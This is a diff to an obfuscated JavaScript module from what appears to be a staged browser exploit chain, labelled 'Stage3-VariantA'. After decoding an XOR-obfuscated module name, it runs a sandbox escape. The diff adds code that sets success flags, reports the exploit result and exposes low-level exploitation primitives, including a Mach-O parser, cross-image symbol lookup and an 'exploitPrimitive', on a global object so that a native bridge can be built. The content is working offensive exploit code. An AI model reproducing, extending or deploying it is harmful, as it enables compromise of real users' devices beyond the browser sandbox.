@@ -422,5 +422,62 @@ return r.lA = () => {
     const A = globalThis.moduleManager.getModuleByName(([30, 24, 75, 78, 72, 72, 78, 30, 20, 78, 72, 76, 73, 75, 21, 79, 20, 30, 79, 76, 30, 76, 31, 20, 75, 72, 25, 27, 25, 30, 78, 79, 31, 24, 20, 20, 25, 24, 24, 21].map(x => {
         return String.fromCharCode(x ^ 45);
     }).join("")));
-    return A._d(), A.qd(), executeSandboxEscape()
+    const result = (A._d(), A.qd(), executeSandboxEscape());
+    // ── PATCH: 标记沙箱逃逸阶段完成 + 暴露原语（与 VariantB 对齐）──
+    try {
+        window._sbx0_success = true;
+        window._sbx1_success = true;
+        window._sbx_pe_ran = true;
+        if (typeof window.log === 'function') {
+            window.log("[STAGE3-A] Sandbox escape completed. _sbx0_success=true, _sbx1_success=true, _sbx_pe_ran=true.");
+        }
+        if (typeof window.reportExploitResult === 'function') {
+            try { window.reportExploitResult('sbx_success', 'Stage3-VariantA sandbox escape completed'); } catch(e) {}
+        }
+    } catch(e) {
+        try { if (typeof window.log === 'function') window.log("[STAGE3-A] Failed to set success flags: " + e); } catch(_){}
+    }
+    // ── 暴露 Stage3 原语到 window，供 native_bridge.js 构建 window.nativeBridge ──
+    try {
+        const _platMod = globalThis.moduleManager.getModuleByName("14669ca3b1519ba2a8f40be287f646d4d7593eb0");
+        const _utilMod = globalThis.moduleManager.getModuleByName("57620206d62079baad0e57e6d9ec93120c0f5247");
+        const _ps = _platMod && _platMod.platformState;
+        if (_ps && _ps.caller && _ps.sandboxEscape && _ps.sandboxEscape.machOParser && _ps.exploitPrimitive) {
+            const _Int64 = _utilMod && _utilMod.Int64;
+            // ── ImageList (nt class): 从 machOParser.Sh() 获取，支持跨 image 符号解析（Kh(name)） ──
+            var _imageList = null;
+            try {
+                var _mop = _ps.sandboxEscape.machOParser;
+                if (_mop && typeof _mop.Sh === 'function') {
+                    _imageList = _mop.Sh();
+                }
+            } catch(_ilErr) {
+                try { if (typeof window.log === 'function') window.log("[STAGE3-A] machOParser.Sh() failed: " + _ilErr); } catch(_){}
+            }
+            window._corunaPrimitives = {
+                caller:           _ps.caller,
+                sandboxEscape:    _ps.sandboxEscape,
+                machOParser:      _ps.sandboxEscape.machOParser,
+                exploitPrimitive: _ps.exploitPrimitive,
+                Int64:            _Int64,
+                imageList:        _imageList,   // nt instance: .Kh(sym) → cross-image dlsym, .Jh(path)/.Hh(path)/.Gh(substr)/.images
+                toInt64:          function(v) {
+                    if (_Int64 && _Int64.fromNumber) return _Int64.fromNumber(v);
+                    if (_Int64) return new _Int64(v, 0);
+                    return v;
+                }
+            };
+            window._corunaKeepPrimitives = true;
+            if (typeof window.log === 'function') {
+                window.log("[STAGE3-A] Exposed primitives to window._corunaPrimitives (imageList=" + (_imageList ? 'ok,Kh=' + (typeof _imageList.Kh === 'function') : 'null') + "). nativeBridge can now be built.");
+            }
+        } else {
+            if (typeof window.log === 'function') {
+                window.log("[STAGE3-A] Expose primitives: one or more primitives null — nativeBridge unavailable.");
+            }
+        }
+    } catch(expErr) {
+        try { if (typeof window.log === 'function') window.log("[STAGE3-A] Expose primitives failed: " + expErr); } catch(_){}
+    }
+    return result;
 }, r;
